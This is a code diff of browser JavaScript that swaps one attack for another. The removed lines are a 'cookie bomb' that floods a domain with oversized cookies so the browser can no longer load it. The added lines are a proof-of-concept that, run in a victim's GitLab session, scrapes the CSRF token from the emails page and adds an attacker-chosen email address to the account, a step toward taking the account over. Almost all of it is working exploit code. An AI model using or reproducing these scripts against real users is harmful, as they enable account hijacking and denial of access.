@@ -1,20 +1,28 @@
-function cookieBomb() {
-    // Get the current domain and its parent domain
-    const domain = document.domain.split('.').splice(-2).join('.');
-    
-    // Create a large string to fill the cookies
-    const pollution = 'a'.repeat(4000); // 4000 characters
-    
-    // Create multiple cookies to flood the browser
-    for (let i = 1; i < 100; i++) {
-        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
-    }
-    
-    // Notify the user when the bomb is complete
-    setTimeout(() => {
-        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
-    }, 1000);
-}
+(async () => {
+  const res = await fetch("https://gitlab.com/-/profile/emails", {
+    credentials: "include",
+  });
+  const text = await res.text();
 
-// Call the function to execute the cookie bomb
-cookieBomb();
+  const token = text.match(/name="authenticity_token" value="([^"]+)"/)?.[1];
+  if (!token) {
+    console.error("CSRF token not found");
+    return;
+  }
+
+  const params = new URLSearchParams();
+  params.append("authenticity_token", token);
+  params.append("email[email]", "powlskydz6845456456456@nikzebio.com");
+
+  await fetch("https://gitlab.com/-/profile/emails", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Origin": "https://gitlab.com"
+    },
+    body: params.toString()
+  });
+
+  console.log("PoC executed");
+})();
